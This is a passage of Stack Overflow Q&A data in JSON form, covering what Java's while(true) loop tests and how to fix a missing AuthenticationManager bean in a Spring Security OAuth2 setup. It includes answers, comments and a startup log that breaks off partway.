101!"},{"owner":{"account_id":1485367,"reputation":122993,"user_id":1393766,"display_name":"Pshemo"},"score":13,"creation_date":1395248515,"post_id":22512830,"comment_id":34254183,"body_markdown":"I don&#39;t understand why anybody would use `while(condition == true) {` instead of `while(condition) {`","body":"I don&#39;t understand why anybody would use <code>while(condition == true) {</code> instead of <code>while(condition) {</code>"},{"owner":{"account_id":318670,"reputation":15681,"user_id":636009,"display_name":"David Conrad"},"score":0,"creation_date":1395248519,"post_id":22512830,"comment_id":34254186,"body_markdown":"Sometimes the exit condition from a loop is complicated, such as in a server that is expected to constantly wait for and process input, until it receives a signal to shut down. In such cases, `while (true)` (or its synonym, `for (;;)`) is sometimes used, and a `break` is performed when the exit condition finally occurs.","body":"Sometimes the exit condition from a loop is complicated, such as in a server that is expected to constantly wait for and process input, until it receives a signal to shut down. In such cases, <code>while (true)</code> (or its synonym, <code>for (;;)</code>) is sometimes used, and a <code>break</code> is performed when the exit condition finally occurs."},{"owner":{"account_id":1223835,"reputation":75858,"user_id":1189885,"accept_rate":43,"display_name":"chrylis -cautiouslyoptimistic-"},"score":2,"creation_date":1395248646,"post_id":22512830,"comment_id":34254294,"body_markdown":"This question appears to be off-topic because it is nonsensical.","body":"This question appears to be off-topic because it is nonsensical."}],"answers":[{"tags":[],"owner":{"account_id":264830,"reputation":70811,"user_id":551406,"accept_rate":95,"display_name":"Michael Berry"},"down_vote_count":0,"up_vote_count":16,"is_accepted":true,"score":16,"last_activity_date":1395248029,"creation_date":1395248029,"answer_id":22512850,"question_id":22512830,"body_markdown":" &gt; When is while(true) true, and when is it false?\r\n\r\nIt&#39;s always true, it&#39;s never false.\r\n\r\nSome people use `while(true)` loops and then use `break` to exit them when a certain condition is true, but it&#39;s generally quite sloppy practice and not recommended. Without the use of `break`, `return`, `System.exit()`, or some other such mechanism, it will keep looping forever.","title":"What condition does while(true) test? When is it true and false?","body":"<blockquote>\n  <p>When is while(true) true, and when is it false?</p>\n</blockquote>\n\n<p>It's always true, it's never false.</p>\n\n<p>Some people use <code>while(true)</code> loops and then use <code>break</code> to exit them when a certain condition is true, but it's generally quite sloppy practice and not recommended. Without the use of <code>break</code>, <code>return</code>, <code>System.exit()</code>, or some other such mechanism, it will keep looping forever.</p>\n"},{"tags":[],"owner":{"account_id":98619,"reputation":1458,"user_id":266836,"accept_rate":41,"display_name":"sunmoon"},"down_vote_count":0,"up_vote_count":1,"is_accepted":false,"score":1,"last_activity_date":1395248076,"creation_date":1395248076,"answer_id":22512866,"question_id":22512830,"body_markdown":"while(true) is always true. Loop statements are executed all the time. If you have to break the loop, we have to use break statement.\r\n","title":"What condition does while(true) test? When is it true and false?","body":"<p>while(true) is always true. Loop statements are executed all the time. If you have to break the loop, we have to use break statement.</p>\n"},{"tags":[],"owner":{"account_id":3377640,"reputation":1844,"user_id":2835475,"display_name":"RKC"},"down_vote_count":0,"up_vote_count":2,"is_accepted":false,"score":2,"last_activity_date":1395248104,"creation_date":1395248104,"answer_id":22512875,"question_id":22512830,"body_markdown":"`condition == true` is also going to return a boolean which is &#39;true&#39;.So using that directly instead of all that.","title":"What condition does while(true) test? When is it true and false?","body":"<p><code>condition == true</code> is also going to return a boolean which is 'true'.So using that directly instead of all that.</p>\n"},{"tags":[],"owner":{"account_id":1853886,"reputation":210597,"user_id":1679863,"accept_rate":77,"display_name":"Rohit Jain"},"down_vote_count":0,"up_vote_count":2,"is_accepted":false,"score":2,"last_activity_date":1554913136,"creation_date":1395248125,"answer_id":22512886,"question_id":22512830,"body_markdown":"`while(true)` loop will of course always iterate. You&#39;ve to manually break out of it using `break`, or `System.exit()`, or may be `return`.\r\n\r\n`while(condition == true)` will be true while `condition` is `true`. You can make that false by setting `condition = false`.\r\n\r\nI would never ever use `while(condition == true)` at least. Instead just use `while (condition)`. That would suffice.","title":"What condition does while(true) test? When is it true and false?","body":"<p><code>while(true)</code> loop will of course always iterate. You've to manually break out of it using <code>break</code>, or <code>System.exit()</code>, or may be <code>return</code>.</p>\n\n<p><code>while(condition == true)</code> will be true while <code>condition</code> is <code>true</code>. You can make that false by setting <code>condition = false</code>.</p>\n\n<p>I would never ever use <code>while(condition == true)</code> at least. Instead just use <code>while (condition)</code>. That would suffice.</p>\n"},{"tags":[],"owner":{"account_id":2789385,"reputation":7148,"user_id":2399935,"accept_rate":86,"display_name":"Brian"},"down_vote_count":0,"up_vote_count":1,"is_accepted":false,"score":1,"last_activity_date":1395248227,"creation_date":1395248227,"answer_id":22512935,"question_id":22512830,"body_markdown":"`while(true)` is used to for infinite loops. They will loop forever because `true` is ALWAYS `true` They are generally used when you have to do something until a certain condition is met. You then exit with the `break` statement\r\n\r\n    while(true) {\r\n      //attempt to satisfy some condition\r\n\r\n      if (satisfied) {\r\n        break;\r\n      }\r\n    }","title":"What condition does while(true) test? When is it true and false?","body":"<p><code>while(true)</code> is used to for infinite loops. They will loop forever because <code>true</code> is ALWAYS <code>true</code> They are generally used when you have to do something until a certain condition is met. You then exit with the <code>break</code> statement</p>\n\n<pre><code>while(true) {\n  //attempt to satisfy some condition\n\n  if (satisfied) {\n    break;\n  }\n}\n</code></pre>\n"},{"tags":[],"owner":{"account_id":3445131,"reputation":507,"user_id":2886134,"accept_rate":50,"display_name":"ExpectoPatronum"},"down_vote_count":0,"up_vote_count":4,"is_accepted":false,"score":4,"last_activity_date":1395249139,"creation_date":1395249139,"answer_id":22513295,"question_id":22512830,"body_markdown":"Though we never know when we encounter a situation where we need it. We can also have infinite for loop. \r\n\r\n    for(;;) {//Code here}","title":"What condition does while(true) test? When is it true and false?","body":"<p>Though we never know when we encounter a situation where we need it. We can also have infinite for loop. </p>\n\n<pre><code>for(;;) {//Code here}\n</code></pre>\n"},{"tags":[],"owner":{"account_id":14282654,"reputation":1,"user_id":10316899,"display_name":"shashi kumar verma"},"down_vote_count":1,"up_vote_count":0,"is_accepted":false,"score":-1,"last_activity_date":1559839036,"creation_date":1559839036,"answer_id":56481774,"question_id":22512830,"body_markdown":" 1. List item\r\n\r\nwhile(True):\r\n   statement\r\n   if(condition):\r\n      break\r\nThis is only work in python \r\nIn java you can write like that for same purpose\r\n\r\nwhile(1==1)\r\n{\r\nStstements...\r\n}","title":"What condition does while(true) test? When is it true and false?","body":"<ol>\n<li>List item</li>\n</ol>\n\n<p>while(True):\n   statement\n   if(condition):\n      break\nThis is only work in python \nIn java you can write like that for same purpose</p>\n\n<p>while(1==1)\n{\nStstements...\n}</p>\n"},{"tags":[],"owner":{"account_id":21463591,"reputation":41,"user_id":15813913,"display_name":"Johan Bekker"},"down_vote_count":0,"up_vote_count":4,"is_accepted":false,"score":4,"last_activity_date":1619945830,"creation_date":1619945830,"answer_id":67354533,"question_id":22512830,"body_markdown":"Here&#39;s a real world example. The while loop will iterate while the user input can&#39;t be parsed to an int. When the user input is parsed to int the loop exits by returning the number entered by the user.\r\n\r\n\r\n    \r\n    private int getNumber(String message) {\r\n        while (true) {  \r\n            System.out.print(message);\r\n            String userInput = scanner.nextLine();\r\n            try {\r\n                return Integer.parseInt(userInput);\r\n            } catch (Exception ignored) {\r\n                System.out.printf(&quot;%s isn&#39;t a number!%n&quot;, userInput);\r\n            }\r\n        }\r\n    }\r\n    ","title":"What condition does while(true) test? When is it true and false?","body":"<p>Here's a real world example. The while loop will iterate while the user input can't be parsed to an int. When the user input is parsed to int the loop exits by returning the number entered by the user.</p>\n<pre><code>private int getNumber(String message) {\n    while (true) {  \n        System.out.print(message);\n        String userInput = scanner.nextLine();\n        try {\n            return Integer.parseInt(userInput);\n        } catch (Exception ignored) {\n            System.out.printf(&quot;%s isn't a number!%n&quot;, userInput);\n        }\n    }\n}\n</code></pre>\n"},{"tags":[],"owner":{"account_id":23825794,"reputation":71,"user_id":17832858,"display_name":"Mink"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1642482280,"creation_date":1642482280,"answer_id":70750510,"question_id":22512830,"body_markdown":"I use **While(true)** when i want to run a loop that does not have a specific case to stop. Of course you can declare some boolean condition, but in my case I want to make my code shorter.\r\n\r\n**For example:** I create a Id number, and I want to check that Id in my database first to see whether it is existing or not. If yes, i create a new id and check again, we may create the existing Id again and again. I use this loop to make sure that the Id number is absolutely unique. If no, I break the loop.\r\n\r\n        int myNewId = createNewId();\r\n\r\n        while(true) {\r\n           if (existingId(newId)) {\r\n             myNewId = createNewId();\r\n           }\r\n           else break;\r\n        }\r\n\r\n","title":"What condition does while(true) test? When is it true and false?","body":"<p>I use <strong>While(true)</strong> when i want to run a loop that does not have a specific case to stop. Of course you can declare some boolean condition, but in my case I want to make my code shorter.</p>\n<p><strong>For example:</strong> I create a Id number, and I want to check that Id in my database first to see whether it is existing or not. If yes, i create a new id and check again, we may create the existing Id again and again. I use this loop to make sure that the Id number is absolutely unique. If no, I break the loop.</p>\n<pre><code>    int myNewId = createNewId();\n\n    while(true) {\n       if (existingId(newId)) {\n         myNewId = createNewId();\n       }\n       else break;\n    }\n</code></pre>\n"}],"owner":{"account_id":3484244,"reputation":675,"user_id":2915567,"accept_rate":88,"display_name":"Gregg1989"},"comment_count":4,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":88450,"favorite_count":0,"down_vote_count":2,"up_vote_count":10,"accepted_answer_id":22512850,"answer_count":9,"score":8,"last_activity_date":1642482280,"creation_date":1395247964,"question_id":22512830,"body_markdown":"I do no understand why anybody would use\r\n\r\n    while(true) {\r\n       //do something\r\n    }\r\n\r\ninstead of \r\n\r\n    boolean condition = true;\r\n    while(condition == true) {\r\n       //do something\r\n    }\r\n\r\nThe latter is super easy to understand, whilst the former is not.\r\n\r\nSo, what condition does while(true) check? When is while(true) true, and when is it false?","title":"What condition does while(true) test? When is it true and false?","body":"<p>I do no understand why anybody would use</p>\n\n<pre><code>while(true) {\n   //do something\n}\n</code></pre>\n\n<p>instead of </p>\n\n<pre><code>boolean condition = true;\nwhile(condition == true) {\n   //do something\n}\n</code></pre>\n\n<p>The latter is super easy to understand, whilst the former is not.</p>\n\n<p>So, what condition does while(true) check? When is while(true) true, and when is it false?</p>\n"},{"tags":["java","spring-boot","spring-security","spring-security-oauth2"],"answers":[{"tags":[],"owner":{"account_id":1712006,"reputation":2649,"user_id":8951344,"display_name":"MuratOzkan"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1523549892,"creation_date":1523549892,"answer_id":49801464,"question_id":49800117,"body_markdown":"The missing class is in `spring-security-core`. Try adding this dependency:\n\n    compile (&#39;org.springframework.boot:spring-boot-starter-security&#39;) \n\n","title":"Field authenticationManager in *** required a bean of type &#39;org.springframework.security.authentication.AuthenticationManager&#39; that could not be found","body":"<p>The missing class is in <code>spring-security-core</code>. Try adding this dependency:</p>\n\n<pre><code>compile ('org.springframework.boot:spring-boot-starter-security') \n</code></pre>\n"},{"tags":[],"owner":{"account_id":9291894,"reputation":339,"user_id":7713739,"display_name":"wtsiamruk"},"down_vote_count":0,"up_vote_count":4,"is_accepted":false,"score":4,"last_activity_date":1550949352,"creation_date":1550421822,"answer_id":54735350,"question_id":49800117,"body_markdown":"Seems that I&#39;ve found the solution to the issue, besides that we need add spring-boot-starter-security dependency, starting from spring-security 5.x bean of type AuthenticationManager is not autoconfigured for you, you need to define one by yourself\r\nsee: https://github.com/spring-projects/spring-boot/wiki/Spring-Boot-2.0-Migration-Guide#authenticationmanager-bean\r\n","title":"Field authenticationManager in *** required a bean of type &#39;org.springframework.security.authentication.AuthenticationManager&#39; that could not be found","body":"<p>Seems that I've found the solution to the issue, besides that we need add spring-boot-starter-security dependency, starting from spring-security 5.x bean of type AuthenticationManager is not autoconfigured for you, you need to define one by yourself\nsee: <a href=\"https://github.com/spring-projects/spring-boot/wiki/Spring-Boot-2.0-Migration-Guide#authenticationmanager-bean\" rel=\"nofollow noreferrer\">https://github.com/spring-projects/spring-boot/wiki/Spring-Boot-2.0-Migration-Guide#authenticationmanager-bean</a></p>\n"},{"tags":[],"owner":{"account_id":15296673,"reputation":305,"user_id":11036516,"display_name":"Vikas s kumar"},"down_vote_count":0,"up_vote_count":7,"is_accepted":false,"score":7,"last_activity_date":1585463286,"creation_date":1585463286,"answer_id":60910891,"question_id":49800117,"body_markdown":"Need to add\r\n```\r\nimport org.springframework.context.annotation.Bean;\r\nimport org.springframework.context.annotation.Configuration;\r\nimport org.springframework.security.authentication.AuthenticationManager;\r\n@Configuration\r\npublic class UserSecurityConfig  extends WebSecurityConfigurerAdapter {\r\n     @Bean\r\n\tpublic AuthenticationManager getAuthenticationManager() throws Exception {\r\n\t\treturn super.authenticationManagerBean();\r\n\t}\r\n}","title":"Field authenticationManager in *** required a bean of type &#39;org.springframework.security.authentication.AuthenticationManager&#39; that could not be found","body":"<p>Need to add</p>\n\n<pre><code>import org.springframework.context.annotation.Bean;\nimport org.springframework.context.annotation.Configuration;\nimport org.springframework.security.authentication.AuthenticationManager;\n@Configuration\npublic class UserSecurityConfig  extends WebSecurityConfigurerAdapter {\n     @Bean\n    public AuthenticationManager getAuthenticationManager() throws Exception {\n        return super.authenticationManagerBean();\n    }\n}\n</code></pre>\n"},{"tags":[],"owner":{"account_id":19923706,"reputation":11,"user_id":14598928,"display_name":"klash"},"down_vote_count":0,"up_vote_count":1,"is_accepted":false,"score":1,"last_activity_date":1642481790,"creation_date":1642481790,"answer_id":70750458,"question_id":49800117,"body_markdown":"Alright, so in recent versions of Spring it is not enough to simply add the bean in your configurer class, you actually need to do something else.\r\n\r\nWhatever dependency missing to autowire or to tcreate a bean, has to be specified in the main class of your application. For your case, let&#39;s say your WebSecurityConfigurerAdapter is under the package &quot;configure&quot;, do the folowing:\r\n\r\n    @SpringBootApplication\r\n    @ComponentScan({&quot;controller&quot;, &quot;services&quot;, &quot;configure&quot;}) // This is what you need\r\n    @EntityScan(&quot;com.my.sso.server.models&quot;)\r\n    public class YourApplicationMainClass { ...\r\n\r\nAlso, when adding and overriding the bean, make sure @Override is above @bean:\r\n\r\n    @Override\r\n\t@Bean\r\n\tpublic AuthenticationManager authenticationManagerBean() throws Exception {\r\n\t    return super.authenticationManagerBean();\r\n\t}","title":"Field authenticationManager in *** required a bean of type &#39;org.springframework.security.authentication.AuthenticationManager&#39; that could not be found","body":"<p>Alright, so in recent versions of Spring it is not enough to simply add the bean in your configurer class, you actually need to do something else.</p>\n<p>Whatever dependency missing to autowire or to tcreate a bean, has to be specified in the main class of your application. For your case, let's say your WebSecurityConfigurerAdapter is under the package &quot;configure&quot;, do the folowing:</p>\n<pre><code>@SpringBootApplication\n@ComponentScan({&quot;controller&quot;, &quot;services&quot;, &quot;configure&quot;}) // This is what you need\n@EntityScan(&quot;com.my.sso.server.models&quot;)\npublic class YourApplicationMainClass { ...\n</code></pre>\n<p>Also, when adding and overriding the bean, make sure @Override is above @bean:</p>\n<pre><code>@Override\n@Bean\npublic AuthenticationManager authenticationManagerBean() throws Exception {\n    return super.authenticationManagerBean();\n}\n</code></pre>\n"}],"owner":{"account_id":3163862,"reputation":36940,"user_id":2674303,"accept_rate":62,"display_name":"gstackoverflow"},"comment_count":0,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":10885,"favorite_count":0,"down_vote_count":0,"up_vote_count":7,"answer_count":4,"score":7,"last_activity_date":1642481790,"creation_date":1523545934,"question_id":49800117,"body_markdown":"I have following class:  \r\n\r\n    @Configuration\r\n    @EnableAuthorizationServer\r\n    public class AuthServerConfig extends AuthorizationServerConfigurerAdapter {\r\n        @Autowired\r\n        private AuthenticationManager authenticationManager;\r\n    \r\n        @Override\r\n        public void configure(AuthorizationServerSecurityConfigurer oauthServer) throws Exception {\r\n            oauthServer.tokenKeyAccess(&quot;permitAll()&quot;)\r\n                    .checkTokenAccess(&quot;isAuthenticated()&quot;);\r\n        }\r\n    \r\n        @Override\r\n        public void configure(ClientDetailsServiceConfigurer clients) throws Exception {\r\n            clients.inMemory()\r\n                    .withClient(&quot;SampleClientId&quot;)\r\n                    .secret(&quot;secret&quot;)\r\n                    .authorizedGrantTypes(&quot;authorization_code&quot;)\r\n                    .scopes(&quot;user_info&quot;)\r\n                    .autoApprove(true) ;\r\n        }\r\n    \r\n        @Override\r\n        public void configure(AuthorizationServerEndpointsConfigurer endpoints) throws Exception {\r\n            endpoints.authenticationManager(authenticationManager);\r\n        }\r\n    }\r\n\r\n\r\nand following dependencies:\r\n\r\n    dependencies {\r\n        compile(&#39;org.springframework.boot:spring-boot-starter-web&#39;)\r\n        testCompile(&#39;org.springframework.boot:spring-boot-starter-test&#39;)\r\n        compile &#39;org.springframework.security.oauth:spring-security-oauth2:2.3.2.RELEASE&#39;    \r\n    }\r\n\r\n\r\nWhen I start application I see following log:\r\n\r\n\r\n    &quot;C:\\Program Files\\Java\\jdk1.8.0_111\\bin\\java&quot; -XX:TieredStopAtLevel=1 -noverify -Dspring.output.ansi.enabled=always -Dcom.sun.management.jmxremote -Dcom.sun.management.jmxremote.port=50479 -Dcom.sun.management.jmxremote.authenticate=false -Dcom.sun.management.jmxremote.ssl=false -Dspring.liveBeansView.mbeanDomain -Dspring.application.admin.enabled=true &quot;-javaagent:C:\\Program Files\\JetBrains\\IntelliJ IDEA 2017.2.1\\lib\\idea_rt.jar=50480:C:\\Program Files\\JetBrains\\IntelliJ IDEA 2017.2.1\\bin&quot; -Dfile.encoding=UTF-8 -classpath &quot;C:\\Program Files\\Java\\jdk1.8.0_111\\jre\\lib\\charsets.jar;C:\\Program Files\\Java\\jdk1.8.0_111\\jre\\lib\\deploy.jar;C:\\Program Files\\Java\\jdk1.8.0_111\\jre\\lib\\ext\\access-bridge-64.jar;C:\\Program Files\\Java\\jdk1.8.0_111\\jre\\lib\\ext\\cldrdata.jar;C:\\Program Files\\Java\\jdk1.8.0_111\\jre\\lib\\ext\\dnsns.jar;C:\\Program Files\\Java\\jdk1.8.0_111\\jre\\lib\\ext\\jaccess.jar;C:\\Program Files\\Java\\jdk1.8.0_111\\jre\\lib\\ext\\jfxrt.jar;C:\\Program Files\\Java\\jdk1.8.0_111\\jre\\lib\\ext\\localedata.jar;C:\\Program Files\\Java\\jdk1.8.0_111\\jre\\lib\\ext\\nashorn.jar;C:\\Program Files\\Java\\jdk1.8.0_111\\jre\\lib\\ext\\sunec.jar;C:\\Program Files\\Java\\jdk1.8.0_111\\jre\\lib\\ext\\sunjce_provider.jar;C:\\Program Files\\Java\\jdk1.8.0_111\\jre\\lib\\ext\\sunmscapi.jar;C:\\Program Files\\Java\\jdk1.8.0_111\\jre\\lib\\ext\\sunpkcs11.jar;C:\\Program Files\\Java\\jdk1.8.0_111\\jre\\lib\\ext\\zipfs.jar;C:\\Program Files\\Java\\jdk1.8.0_111\\jre\\lib\\javaws.jar;C:\\Program Files\\Java\\jdk1.8.0_111\\jre\\lib\\jce.jar;C:\\Program Files\\Java\\jdk1.8.0_111\\jre\\lib\\jfr.jar;C:\\Program Files\\Java\\jdk1.8.0_111\\jre\\lib\\jfxswt.jar;C:\\Program Files\\Java\\jdk1.8.0_111\\jre\\lib\\jsse.jar;C:\\Program Files\\Java\\jdk1.8.0_111\\jre\\lib\\management-agent.jar;C:\\Program Files\\Java\\jdk1.8.0_111\\jre\\lib\\plugin.jar;C:\\Program Files\\Java\\jdk1.8.0_111\\jre\\lib\\resources.jar;C:\\Program Files\\Java\\jdk1.8.0_111\\jre\\lib\\rt.jar;D:\\work\\sso\\server\\out\\production\\classes;D:\\work\\sso\\server\\out\\production\\resources;C:\\Users\\ntkachev\\.gradle\\caches\\modules-2\\files-2.1\\org.springframework.boot\\spring-boot-starter-web\\2.0.1.RELEASE\\88751ed76791d12425ce5a80476baf1749a44cf4\\spring-boot-starter-web-2.0.1.RELEASE.jar;C:\\Users\\ntkachev\\.gradle\\caches\\modules-2\\files-2.1\\org.springframework.security.oauth\\spring-security-oauth2\\2.3.2.RELEASE\\cf6e03591f593139f1d1d44278d962090aa226c9\\spring-security-oauth2-2.3.2.RELEASE.jar;C:\\Users\\ntkachev\\.gradle\\caches\\modules-2\\files-2.1\\org.springframework.boot\\spring-boot-starter-json\\2.0.1.RELEASE\\f2e1aeeb1ac02bfa1b4f7254633484af1866fc65\\spring-boot-starter-json-2.0.1.RELEASE.jar;C:\\Users\\ntkachev\\.gradle\\caches\\modules-2\\files-2.1\\org.springframework.boot\\spring-boot-starter\\2.0.1.RELEASE\\33abc1286b0aabea4f08ff4285d09e587835a716\\spring-boot-starter-2.0.1.RELEASE.jar;C:\\Users\\ntkachev\\.gradle\\caches\\modules-2\\files-2.1\\org.springframework.boot\\spring-boot-starter-tomcat\\2.0.1.RELEASE\\4b46f4aaff6c8a5a1c8184996d5e9e8a9354db8d\\spring-boot-starter-tomcat-2.0.1.RELEASE.jar;C:\\Users\\ntkachev\\.gradle\\caches\\modules-2\\files-2.1\\org.hibernate.validator\\hibernate-validator\\6.0.9.Final\\b149e4cce82379f11f6129eb3187ca8ae5404005\\hibernate-validator-6.0.9.Final.jar;C:\\Users\\ntkachev\\.gradle\\caches\\modules-2\\files-2.1\\org.springframework\\spring-webmvc\\5.0.5.RELEASE\\a7fd53c7ad06b0fa7dd4ff347de1b2dc508739e\\spring-webmvc-5.0.5.RELEASE.jar;C:\\Users\\ntkachev\\.gradle\\caches\\modules-2\\files-2.1\\org.springframework.security\\spring-security-web\\5.0.4.RELEASE\\bd2592c928d043f70742fd8ae409f751a63132dd\\spring-security-web-5.0.4.RELEASE.jar;C:\\Users\\ntkachev\\.gradle\\caches\\modules-2\\files-2.1\\org.springframework\\spring-web\\5.0.5.RELEASE\\d51dbb5cabe72ae02e400577bac48f7fc94088de\\spring-web-5.0.5.RELEASE.jar;C:\\Users\\ntkachev\\.gradle\\caches\\modules-2\\files-2.1\\org.springframework.security\\spring-security-config\\5.0.4.RELEASE\\355fc8c3d1c61fe85915082587946ad346250d85\\spring-security-config-5.0.4.RELEASE.jar;C:\\Users\\ntkachev\\.gradle\\caches\\modules-2\\files-2.1\\org.springframework.security\\spring-security-core\\5.0.4.RELEASE\\f2924cd62fa8b14546b2b3c31dcd9e55abf9a5e\\spring-security-core-5.0.4.RELEASE.jar;C:\\Users\\ntkachev\\.gradle\\caches\\modules-2\\files-2.1\\org.springframework.boot\\spring-boot-autoconfigure\\2.0.1.RELEASE\\b0bf9d34ed70c6987a86cd58a009065e5fa02545\\spring-boot-autoconfigure-2.0.1.RELEASE.jar;C:\\Users\\ntkachev\\.gradle\\caches\\modules-2\\files-2.1\\org.springframework.boot\\spring-boot\\2.0.1.RELEASE\\b8c5b14cbb0e52fdded8f98a8c1493cc74c7cf59\\spring-boot-2.0.1.RELEASE.jar;C:\\Users\\ntkachev\\.gradle\\caches\\modules-2\\files-2.1\\org.springframework\\spring-context\\5.0.5.RELEASE\\9cca4bf5acb693249a01c218f471c677b951d6e2\\spring-context-5.0.5.RELEASE.jar;C:\\Users\\ntkachev\\.gradle\\caches\\modules-2\\files-2.1\\org.springframework\\spring-aop\\5.0.5.RELEASE\\b11b61b94d7fb752a1c9bf3461d655c3084fae47\\spring-aop-5.0.5.RELEASE.jar;C:\\Users\\ntkachev\\.gradle\\caches\\modules-2\\files-2.1\\org.springframework\\spring-beans\\5.0.5.RELEASE\\984445863c0bbdaaf860615762d998b471a6bf92\\spring-beans-5.0.5.RELEASE.jar;C:\\Users\\ntkachev\\.gradle\\caches\\modules-2\\files-2.1\\org.springframework\\spring-expression\\5.0.5.RELEASE\\fc6c7a95aeb7d00f4c65c338b08d97767eb0dd99\\spring-expression-5.0.5.RELEASE.jar;C:\\Users\\ntkachev\\.gradle\\caches\\modules-2\\files-2.1\\org.springframework\\spring-core\\5.0.5.RELEASE\\1bd9feb1d9dac6accd27f5244b6c47cfcb55045c\\spring-core-5.0.5.RELEASE.jar;C:\\Users\\ntkachev\\.gradle\\caches\\modules-2\\files-2.1\\commons-codec\\commons-codec\\1.11\\3acb4705652e16236558f0f4f2192cc33c3bd189\\commons-codec-1.11.jar;C:\\Users\\ntkachev\\.gradle\\caches\\modules-2\\files-2.1\\org.codehaus.jackson\\jackson-mapper-asl\\1.9.13\\1ee2f2bed0e5dd29d1cb155a166e6f8d50bbddb7\\jackson-mapper-asl-1.9.13.jar;C:\\Users\\ntkachev\\.gradle\\caches\\modules-2\\files-2.1\\org.springframework.boot\\spring-boot-starter-logging\\2.0.1.RELEASE\\10681a28c95e9f9c0159327a1ed0c860517c7ad7\\spring-boot-starter-logging-2.0.1.RELEASE.jar;C:\\Users\\ntkachev\\.gradle\\caches\\modules-2\\files-2.1\\javax.annotation\\javax.annotation-api\\1.3.2\\934c04d3cfef185a8008e7bf34331b79730a9d43\\javax.annotation-api-1.3.2.jar;C:\\Users\\ntkachev\\.gradle\\caches\\modules-2\\files-2.1\\org.yaml\\snakeyaml\\1.19\\2d998d3d674b172a588e54ab619854d073f555b5\\snakeyaml-1.19.jar;C:\\Users\\ntkachev\\.gradle\\caches\\modules-2\\files-2.1\\com.fasterxml.jackson.datatype\\jackson-datatype-jdk8\\2.9.5\\23e37f085279ba316c0df923513b81609e1d1f6\\jackson-datatype-jdk8-2.9.5.jar;C:\\Users\\ntkachev\\.gradle\\caches\\modules-2\\files-2.1\\com.fasterxml.jackson.datatype\\jackson-datatype-jsr310\\2.9.5\\d1f0d11e816bc04e222a261106ca138801841c2d\\jackson-datatype-jsr310-2.9.5.jar;C:\\Users\\ntkachev\\.gradle\\caches\\modules-2\\files-2.1\\com.fasterxml.jackson.module\\jackson-module-parameter-names\\2.9.5\\f824c60751ffb7bfc3a0d30dfe0e42317d8e67f5\\jackson-module-parameter-names-2.9.5.jar;C:\\Users\\ntkachev\\.gradle\\caches\\modules-2\\files-2.1\\com.fasterxml.jackson.core\\jackson-databind\\2.9.5\\3490508379d065fe3fcb80042b62f630f7588606\\jackson-databind-2.9.5.jar;C:\\Users\\ntkachev\\.gradle\\caches\\modules-2\\files-2.1\\org.apache.tomcat.embed\\tomcat-embed-websocket\\8.5.29\\37786f4ca8a1597a91a0f437e659a76d1fcc5bf1\\tomcat-embed-websocket-8.5.29.jar;C:\\Users\\ntkachev\\.gradle\\caches\\modules-2\\files-2.1\\org.apache.tomcat.embed\\tomcat-embed-core\\8.5.29\\51eac5adde4bc019261b787cb99e5548206908e6\\tomcat-embed-core-8.5.29.jar;C:\\Users\\ntkachev\\.gradle\\caches\\modules-2\\files-2.1\\org.apache.tomcat.embed\\tomcat-embed-el\\8.5.29\\893fb2c87ec1aa248a7911d76c0c06b3fca6bc9b\\tomcat-embed-el-8.5.29.jar;C:\\Users\\ntkachev\\.gradle\\caches\\modules-2\\files-2.1\\javax.validation\\validation-api\\2.0.1.Final\\cb855558e6271b1b32e716d24cb85c7f583ce09e\\validation-api-2.0.1.Final.jar;C:\\Users\\ntkachev\\.gradle\\caches\\modules-2\\files-2.1\\org.jboss.logging\\jboss-logging\\3.3.2.Final\\3789d00e859632e6c6206adc0c71625559e6e3b0\\jboss-logging-3.3.2.Final.jar;C:\\Users\\ntkachev\\.gradle\\caches\\modules-2\\files-2.1\\com.fasterxml\\classmate\\1.3.4\\3d5f48f10bbe4eb7bd862f10c0583be2e0053c6\\classmate-1.3.4.jar;C:\\Users\\ntkachev\\.gradle\\caches\\modules-2\\files-2.1\\org.springframework\\spring-jcl\\5.0.5.RELEASE\\f4a2854b9d865e8b86717595aec16f877f8c6489\\spring-jcl-5.0.5.RELEASE.jar;C:\\Users\\ntkachev\\.gradle\\caches\\modules-2\\files-2.1\\org.codehaus.jackson\\jackson-core-asl\\1.9.13\\3c304d70f42f832e0a86d45bd437f692129299a4\\jackson-core-asl-1.9.13.jar;C:\\Users\\ntkachev\\.gradle\\caches\\modules-2\\files-2.1\\ch.qos.logback\\logback-classic\\1.2.3\\7c4f3c474fb2c041d8028740440937705ebb473a\\logback-classic-1.2.3.jar;C:\\Users\\ntkachev\\.gradle\\caches\\modules-2\\files-2.1\\org.apache.logging.log4j\\log4j-to-slf4j\\2.10.0\\f7e631ccf49cfc0aefa4a2a728da7d374c05bd3c\\log4j-to-slf4j-2.10.0.jar;C:\\Users\\ntkachev\\.gradle\\caches\\modules-2\\files-2.1\\org.slf4j\\jul-to-slf4j\\1.7.25\\af5364cd6679bfffb114f0dec8a157aaa283b76\\jul-to-slf4j-1.7.25.jar;C:\\Users\\ntkachev\\.gradle\\caches\\modules-2\\files-2.1\\com.fasterxml.jackson.core\\jackson-annotations\\2.9.0\\7c10d545325e3a6e72e06381afe469fd40eb701\\jackson-annotations-2.9.0.jar;C:\\Users\\ntkachev\\.gradle\\caches\\modules-2\\files-2.1\\com.fasterxml.jackson.core\\jackson-core\\2.9.5\\a22ac51016944b06fd9ffbc9541c6e7ce5eea117\\jackson-core-2.9.5.jar;C:\\Users\\ntkachev\\.gradle\\caches\\modules-2\\files-2.1\\ch.qos.logback\\logback-core\\1.2.3\\864344400c3d4d92dfeb0a305dc87d953677c03c\\logback-core-1.2.3.jar;C:\\Users\\ntkachev\\.gradle\\caches\\modules-2\\files-2.1\\org.slf4j\\slf4j-api\\1.7.25\\da76ca59f6a57ee3102f8f9bd9cee742973efa8a\\slf4j-api-1.7.25.jar;C:\\Users\\ntkachev\\.gradle\\caches\\modules-2\\files-2.1\\org.apache.logging.log4j\\log4j-api\\2.10.0\\fec5797a55b786184a537abd39c3fa1449d752d6\\log4j-api-2.10.0.jar&quot; com.my.sso.server.AuthorizationServerApplication\r\n    \r\n      .   ____          _            __ _ _\r\n     /\\\\ / ___&#39;_ __ _ _(_)_ __  __ _ \\ \\ \\ \\\r\n    ( ( )\\___ | &#39;_ | &#39;_| | &#39;_ \\/ _` | \\ \\ \\ \\\r\n     \\\\/  ___)| |_)| | | | | || 